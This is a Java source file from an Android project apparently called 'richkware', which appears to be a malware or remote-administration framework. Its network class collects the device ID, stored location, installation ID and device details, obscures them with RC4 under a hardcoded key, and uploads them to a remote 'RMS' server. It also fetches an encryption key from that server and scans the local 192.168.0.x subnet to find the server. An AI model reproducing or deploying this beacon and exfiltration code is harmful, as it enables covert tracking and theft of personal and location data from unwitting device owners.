package it.richkmeli.richkware.network;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

import it.richkmeli.jframework.crypto.algorithm.RC4;
import it.richkmeli.jframework.network.scan.NetworkScanner;
import it.richkmeli.jframework.network.tcp.client.okhttp.Network;
import it.richkmeli.jframework.network.tcp.client.okhttp.NetworkCallback;
import it.richkmeli.jframework.network.tcp.client.okhttp.NetworkException;
import it.richkmeli.jframework.network.tcp.client.okhttp.util.ResponseParser;
import it.richkmeli.richkware.component.notification.NotificationManager;
import it.richkmeli.richkware.component.notification.NotificationType;
import it.richkmeli.richkware.storage.StorageKey;
import it.richkmeli.richkware.storage.StorageManager;
import it.richkmeli.richkware.system.device.Device;
import it.richkmeli.richkware.util.Logger;

import static android.content.Context.CONNECTIVITY_SERVICE;

public class NetworkManager {
    private Network network;

    public NetworkManager() {
        network = new Network();
    }

    public void uploadInfoToRms(Context context, RichkwareCallback callback) {
        try {
            getUrlFromSetting(context);

            JSONObject payload = new JSONObject();
            // device ID
            payload.put("data0", RC4.encrypt(Device.getDeviceID(context), "richktest"));
            // data
            JSONObject dataPayload = new JSONObject();
            dataPayload.put("serverPort", "none");
            dataPayload.put("associatedUser", "richk3@i.it");
            dataPayload.put("location", StorageManager.read(context, StorageKey.LOCATION));
            dataPayload.put("installationId", StorageManager.read(context, StorageKey.INSTALLATION_ID));
            dataPayload.put("deviceInfo", Device.getDeviceInfo());
            payload.put("data", RC4.encrypt(dataPayload.toString(), "richktest"));
            // channel
            payload.put("channel", "richkware");

            network.putRequest("device", payload.toString(), null, new NetworkCallback() {
                @Override
                public void onSuccess(String response) {
                    try {
                        if (ResponseParser.isStatusOK(response))
                            callback.onSuccess(ResponseParser.parseMessage(response));
                        else
                            callback.onFailure(ResponseParser.parseMessage(response));
                    } catch (JSONException e) {
                        NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(Exception e) {
                    callback.onFailure(e.getMessage());
                }
            });
        } catch (Exception e) {
            Logger.error(e);
        }
    }

    public void getEncryptionKeyFromRMS(Context context, RichkwareCallback callback) {
        try {
            getUrlFromSetting(context);

            JSONObject payload = new JSONObject();
            // device ID
            payload.put("id", RC4.encrypt(Device.getDeviceID(context), "richktest"));
            payload.put("channel", "richkware");

            network.getRequest("encryptionKey", payload.toString(), "", null, new NetworkCallback() {
                @Override
                public void onSuccess(String response) {
                    try {
                        if (ResponseParser.isStatusOK(response))
                            callback.onSuccess(ResponseParser.parseMessage(response));
                        else
                            callback.onFailure(ResponseParser.parseMessage(response));
                    } catch (JSONException e) {
                        NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
                        e.printStackTrace();
                    }
                }

                @Override
                public void onFailure(Exception e) {
                    callback.onFailure(e.getMessage());
                }
            });
        } catch (Exception e) {
            NotificationManager.notify(context, NotificationType.TOAST_SHORT, e.getMessage());
            e.printStackTrace();
        }
    }

    public void getStatus(Context context, String server) {
        try {
            String protocol = StorageManager.read(context, StorageKey.NETWORK_PROTOCOL);
            String port = protocol.equalsIgnoreCase("HTTPS") ? "443" : "8080";
            String service = StorageManager.read(context, StorageKey.NETWORK_SERVICE);

            String server2 = server;
            if (server.contains("(") && server.contains(")")) {
                server2 = server.substring(server.indexOf("(") + 1, server.indexOf(")"));
            }
            Logger.info(server2);
            network.setURL(protocol, server2, port, service);


            final String finalServer = server2;
            network.getRequest("status", "", "", null, false, new NetworkCallback() {
                @Override
                public void onSuccess(String response) {
                    try {
                        if (ResponseParser.isStatusOK(response)) {
                            if ("UP".equalsIgnoreCase(ResponseParser.parseMessage(response))) {
                                StorageManager.save(context, StorageKey.NETWORK_SERVER, finalServer);
                                String message = "RMS server: " + finalServer + " found";
                                Logger.info(message);
                                //NotificationManager.notify(context, NotificationType.TOAST_SHORT, "RMS server: " + finalServer + " found");
                            }
                        }
                    } catch (JSONException e) {
                        // if this network call is in a thread do not use toast messages
                        Logger.error(e);
                    }
                }

                @Override
                public void onFailure(Exception e) {
                }
            });
        } catch (Exception e) {
            // if this network call is in a thread do not use toast messages
            Logger.error(e);
        }
    }

    // call every active host and replace server configuration with the active rms server
    public static void rmsLocalNetworkDiscovery(Context context) {
        List<String> activeHosts = NetworkScanner.getActiveHosts("192.168.0");
        NetworkManager networkManager = new NetworkManager();
        for (String activehost : activeHosts) {
            networkManager.getStatus(context, activehost);
        }
    }

    private void getUrlFromSetting(Context context) throws NetworkException {
        String protocol = StorageManager.read(context, StorageKey.NETWORK_PROTOCOL);
        String port = protocol.equalsIgnoreCase("HTTPS") ? "443" : "8080";
        String server = StorageManager.read(context, StorageKey.NETWORK_SERVER);
        String service = StorageManager.read(context, StorageKey.NETWORK_SERVICE);
        network.setURL(protocol, server, port, service);
    }

    public static boolean isNetworkAvailable(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        NetworkInfo networkInfo = cm.getActiveNetworkInfo();
        return networkInfo != null && networkInfo.isConnected();
    }

    public static NetworkInfo getNetworkInfo(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context.getSystemService(CONNECTIVITY_SERVICE);
        return cm.getActiveNetworkInfo();
    }

}
